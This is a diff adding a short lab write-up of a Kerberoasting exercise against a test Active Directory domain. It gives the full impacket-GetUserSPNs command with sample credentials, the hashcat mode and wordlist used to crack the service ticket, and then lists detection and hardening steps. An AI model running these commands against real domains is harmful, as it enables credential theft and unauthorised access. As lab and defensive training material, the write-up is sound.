@@ -1,0 +1,38 @@
+=== Scenario 4: Kerberoasting ===
+Date: 2026-06-11
+Objective: Extract and crack Kerberos service tickets from Active Directory
+
+Target Information:
+- Domain: lab.local
+- DC: DC01 (192.168.161.10)
+- Target Account: sqlsvc (MSSQLSvc/dc01.lab.local:1433)
+
+Attack Platform:
+- IP: 192.168.161.128
+- OS: Kali Linux
+- Tools: impacket-GetUserSPNs, hashcat
+
+Phase 1: SPN Discovery
+- Command: impacket-GetUserSPNs lab.local/jsmith:Password@123 -dc-ip 192.168.161.10 -request
+- Result: Kerberos ticket extracted for sqlsvc
+
+Phase 2: Password Cracking
+- Tool: hashcat -m 13100
+- Wordlist: rockyou.txt
+- Result: Password@123 cracked successfully
+
+=== Summary ===
+Status: SUCCESS
+- Service account ticket captured
+- Password cracked offline in seconds
+- No detection without SIEM monitoring
+
+Key Findings:
+1. Weak service account password vulnerable to cracking
+2. Any domain user can request service tickets
+3. Attack leaves minimal logs without monitoring
+
+Recommendations:
+- Use strong passwords (25+ chars) for service accounts
+- Enable Kerberos logging in Event Viewer
+- Monitor Event ID 4769 in SIEM
